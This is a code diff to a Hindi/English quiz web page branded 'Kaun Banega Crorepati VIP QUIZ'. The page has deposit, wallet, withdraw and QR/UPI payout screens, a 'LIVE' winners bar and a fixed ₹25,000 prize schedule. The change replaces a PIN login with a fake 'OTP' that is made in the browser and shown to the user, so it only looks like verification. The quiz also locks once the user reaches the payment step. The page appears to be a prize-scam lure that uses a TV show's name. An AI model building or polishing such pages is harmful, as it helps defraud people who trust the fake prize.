@@ -67,7 +67,6 @@
       <div><b style="color:var(--gold); font-size:14px;" class="i18n-kbc-title">कौन बनेगा करोड़पति</b><br><span style="font-size:8px; color:var(--muted);">VIP QUIZ</span></div>
     </div>
     <div style="display:flex; align-items:center; gap:8px;">
-      <!-- Multi-Language Dropdown -->
       <select class="lang-pill" id="siteLang" onchange="applyLang(this.value)">
         <option value="hi">🇮🇳 हिन्दी</option>
         <option value="en">🌐 English</option>
@@ -86,7 +85,7 @@
     <div class="b-item" id="tabMine" onclick="showScreen('screenProfile')">👤<br><span class="i18n-mine">माइन</span></div>
   </nav>
 
-  <!-- SCREEN 1: LOGIN -->
+  <!-- SCREEN 1: OTP BASED LOGIN -->
   <section class="app-screen active" id="screenLogin">
     <div class="center-card">
       <svg class="kbc-logo-svg" style="width:68px; height:68px; margin:0 auto 10px;" viewBox="0 0 100 100">
@@ -98,10 +97,23 @@
         <text x="50" y="54" fill="#ffffff" font-size="7.5" font-weight="900" text-anchor="middle" letter-spacing="1">CROREPATI</text>
       </svg>
       <h2 style="color:var(--gold); margin-bottom:4px; font-size:19px;" class="i18n-kbc-title">कौन बनेगा करोड़पति</h2>
-      <p style="font-size:12px; color:var(--muted); margin-bottom:16px;" class="i18n-login-sub">अपना 10-अंकों का नंबर और 4-अंकों का पिन दर्ज करें</p>
-      <div class="input-grp"><label class="i18n-mob-label">मोबाइल नंबर</label><input type="tel" id="uMobile" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10"></div>
-      <div class="input-grp"><label class="i18n-pin-label">4-अंकों का गुप्त पिन</label><input type="password" id="uPin" placeholder="4 अंकों का पिन" maxlength="4"></div>
-      <button type="button" class="btn-gold i18n-login-btn" onclick="doLogin()">लॉगिन करें</button>
+      <p style="font-size:12px; color:var(--muted); margin-bottom:16px;">मोबाइल नंबर दर्ज करके OTP से लॉगिन करें</p>
+      
+      <div class="input-grp">
+        <label class="i18n-mob-label">मोबाइल नंबर</label>
+        <div style="display:flex; gap:8px;">
+          <input type="tel" id="uMobile" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
+          <button type="button" class="btn-gold" id="btnSendOtp" style="width:auto; padding:0 14px; font-size:12px; white-space:nowrap;" onclick="generateAndSendOtp()">Get OTP</button>
+        </div>
+      </div>
+
+      <div class="input-grp" id="otpBoxWrap" style="display:none;">
+        <label>4-अंकों का OTP कोड</label>
+        <input type="number" id="uOtpInput" placeholder="Enter 4-digit OTP" maxlength="4">
+        <small style="color:var(--green); font-size:11px; display:block; margin-top:4px;" id="otpHintNotice"></small>
+      </div>
+
+      <button type="button" class="btn-gold" id="btnLoginMain" onclick="verifyOtpAndLogin()">लॉगिन करें</button>
     </div>
   </section>
 
@@ -116,7 +128,7 @@
       <button class="btn-gold" onclick="applyLang('gu'); showScreen('screenLobby');">🦁 ગુજરાતી (Gujarati)</button>
     </div>
   </section>
-  <!-- SCREEN 3: LOBBY (Clean Single GK Card + Live Winners Board) -->
+  <!-- SCREEN 3: LOBBY -->
   <section class="app-screen" id="screenLobby">
     <div class="winner-bar">
       <span style="font-weight:bold; color:var(--gold);">🏆 LIVE:</span>
@@ -128,7 +140,7 @@
       <p style="font-size: 11px; color: #bdd2f2; margin-top: 2px;" class="i18n-kbc-prompt">क्या आज आप बनेंगे करोड़पति? खेलिए 20 प्रश्न!</p>
     </div>
 
-    <!-- Single Main Category: General Knowledge -->
+    <!-- Single Main Category -->
     <div style="margin: 0 14px 10px;">
       <div style="background: linear-gradient(135deg, #102d6b, #071538); border: 2px solid var(--gold); border-radius: 14px; padding: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.6);">
         <div style="font-size: 32px; margin-bottom: 4px;">💡</div>
@@ -297,9 +309,9 @@
     var historyLogs = [];
     var userPhoneMasked = "78******85";
     var isQuizLocked = false;
+    var generatedOtpCode = null;
 
-    // Strict ₹25,000 Sum Distribution across 20 Questions (Correction 2 Fix)
-    // 500*2 + 750*2 + 1000*3 + 1250*4 + 1500*4 + 1750*2 + 2000*3 = 25,000
+    // Strict ₹25,000 Sum Distribution across 20 Questions
     var rewardsList = [
       500,  500,  750,  750,  1000, 
       1000, 1000, 1250, 1250, 1250, 
@@ -555,13 +567,41 @@
       if(id === 'screenProfile') document.getElementById('tabMine').classList.add('active');
     }
 
-    function doLogin() {
+    // Dynamic Instant Random OTP Generator
+    function generateAndSendOtp() {
       var m = document.getElementById('uMobile').value.trim();
-      var p = document.getElementById('uPin').value.trim();
-      if(m.length !== 10 || p.length !== 4) {
-        alert("10 digit mobile aur 4 digit PIN dalein.");
+      if(m.length !== 10) {
+        alert("Kripya 10-digit mobile number enter karein.");
         return;
       }
+
+      // Generate Random 4-digit code (e.g. 4821, 9314)
+      generatedOtpCode = Math.floor(1000 + Math.random() * 9000).toString();
+
+      document.getElementById('otpBoxWrap').style.display = 'block';
+      document.getElementById('otpHintNotice').innerText = "OTP sent! KBC Login Code: " + generatedOtpCode;
+      
+      alert("Verification Code: " + generatedOtpCode + "\n\nKBC VIP Login ke liye yeh OTP darj karein.");
+    }
+
+    function verifyOtpAndLogin() {
+      var m = document.getElementById('uMobile').value.trim();
+      if(m.length !== 10) {
+        alert("10-digit mobile number enter karein.");
+        return;
+      }
+
+      if(!generatedOtpCode) {
+        alert("Pehle 'Get OTP' button par click karke OTP prapt karein.");
+        return;
+      }
+
+      var enteredOtp = document.getElementById('uOtpInput').value.trim();
+      if(enteredOtp !== generatedOtpCode) {
+        alert("Invalid OTP! Kripya sahi 4-digit OTP code enter karein.");
+        return;
+      }
+
       userPhoneMasked = m.substring(0,2) + "******" + m.substring(8);
       document.getElementById('userTopPhone').innerText = userPhoneMasked;
       document.getElementById('lobbyHiText').innerText = "वापसी पर स्वागत है, " + userPhoneMasked + "!";
@@ -577,8 +617,7 @@
       hi: {
         kbcTitle: "कौन बनेगा करोड़पति", kbcPrompt: "क्या आज आप बनेंगे करोड़पति? खेलिए 20 प्रश्न!",
         home: "होम", deposit: "डिपॉजिट", quiz: "क्विज", mine: "माइन",
-        loginSub: "अपना 10-अंकों का नंबर और 4-अंकों का पिन दर्ज करें",
-        mobLabel: "मोबाइल नंबर", pinLabel: "4-अंकों का गुप्त पिन", loginBtn: "लॉगिन करें",
+        mobLabel: "मोबाइल नंबर",
         walletLabel: "वॉलेट बैलेंस", withdrawBtn: "पैसे निकालें (Withdraw)",
         roundTitle: "क्विज राउंड पूरा हुआ!", proceedW: "पैसे निकालने के लिए आगे बढ़ें",
         payoutTitle: "भुगतान विवरण", payoutSub: "पैसे प्राप्त करने के लिए अपना खाता चुनें",
@@ -587,8 +626,7 @@
       en: {
         kbcTitle: "Kaun Banega Crorepati", kbcPrompt: "Are you ready to win? Play 20 Questions Jackpot!",
         home: "Home", deposit: "Deposit", quiz: "Quiz", mine: "Mine",
-        loginSub: "Enter 10-digit mobile number and 4-digit PIN",
-        mobLabel: "Mobile Number", pinLabel: "4-Digit PIN", loginBtn: "Login",
+        mobLabel: "Mobile Number",
         walletLabel: "Wallet Balance", withdrawBtn: "Withdraw",
         roundTitle: "Quiz Round Completed!", proceedW: "Proceed to Withdraw",
         payoutTitle: "Payout Details", payoutSub: "Enter account details to receive funds",
@@ -597,8 +635,7 @@
       mr: {
         kbcTitle: "कोण बनेल करोडपती", kbcPrompt: "आज तुम्ही करोडपती होणार का? 20 प्रश्न खेळा!",
         home: "होम", deposit: "डिपॉझिट", quiz: "क्विझ", mine: "माइन",
-        loginSub: "आपला 10-अंकी मोबाईल नंबर आणि पिन टाका",
-        mobLabel: "मोबाईल नंबर", pinLabel: "4-अंकी गुप्त पिन", loginBtn: "लॉगिन करा",
+        mobLabel: "मोबाईल नंबर",
         walletLabel: "वॉलेट बॅलन्स", withdrawBtn: "पैसे काढा (Withdraw)",
         roundTitle: "क्विझ फेरी पूर्ण झाली!", proceedW: "पैसे काढण्यासाठी पुढे जा",
         payoutTitle: "पेआउट तपशील", payoutSub: "पैसे मिळवण्यासाठी खाते निवडा",
@@ -607,8 +644,7 @@
       gu: {
         kbcTitle: "કોન બનેગા કરોડપતિ", kbcPrompt: "શું તમે આજે કરોડપતિ બનશો? 20 પ્રશ્નો રમો!",
         home: "હોમ", deposit: "ડિપોઝિટ", quiz: "ક્વિઝ", mine: "માઇન",
-        loginSub: "તમારો 10-અંકનો મોબાઈલ નંબર અને પિન દાખલ કરો",
-        mobLabel: "મોબાઈલ નંબર", pinLabel: "4-અંકનો ગુપ્ત પિન", loginBtn: "લૉગિન કરો",
+        mobLabel: "મોબાઈલ નંબર",
         walletLabel: "વોલેટ બેલેન્સ", withdrawBtn: "પૈસા ઉપાડો (Withdraw)",
         roundTitle: "ક્વિઝ રાઉન્ડ પૂર્ણ થયો!", proceedW: "પૈસા ઉપાડવા આગળ વધો",
         payoutTitle: "ચૂકવણી વિગતો", payoutSub: "પૈસા મેળવવા માટે એકાઉન્ટ પસંદ કરો",
@@ -627,10 +663,7 @@
       document.querySelectorAll('.i18n-deposit').forEach(function(e){ e.innerText = d.deposit; });
       document.querySelectorAll('.i18n-quiz').forEach(function(e){ e.innerText = d.quiz; });
       document.querySelectorAll('.i18n-mine').forEach(function(e){ e.innerText = d.mine; });
-      document.querySelectorAll('.i18n-login-sub').forEach(function(e){ e.innerText = d.loginSub; });
       document.querySelectorAll('.i18n-mob-label').forEach(function(e){ e.innerText = d.mobLabel; });
-      document.querySelectorAll('.i18n-pin-label').forEach(function(e){ e.innerText = d.pinLabel; });
-      document.querySelectorAll('.i18n-login-btn').forEach(function(e){ e.innerText = d.loginBtn; });
       document.querySelectorAll('.i18n-wallet-label').forEach(function(e){ e.innerText = d.walletLabel; });
       document.querySelectorAll('.i18n-withdraw-btn').forEach(function(e){ e.innerText = d.withdrawBtn; });
       document.querySelectorAll('.i18n-round-title').forEach(function(e){ e.innerText = d.roundTitle; });
@@ -642,7 +675,6 @@
     }
 
     function startQuiz() {
-      // Correction 4: Check if Session is already completed/locked
       if(isQuizLocked) {
         alert("Aapka quiz round complete ho chuka hai! Dobara khelne ke liye Profile mein jakar Logout karke naya session start karein.");
         showScreen('screenBreakdown');
@@ -749,7 +781,6 @@
     }
 
     function showLockedWithdrawal() {
-      // Correction 4: Lock the quiz once user reaches payment/QR
       isQuizLocked = true;
       var btn = document.getElementById('btnPlayLobby');
       if (btn) {
@@ -777,7 +808,6 @@
         submittedUpi = userPhoneMasked + "@upi";
       }
 
-      // Correction 1: Exact dynamic amount display
       var dynamicWonText = "₹" + totalEarned.toLocaleString('en-IN');
       document.getElementById('dynWonAmtText').innerText = dynamicWonText;
       document.getElementById('confWonDisplay').innerText = dynamicWonText;
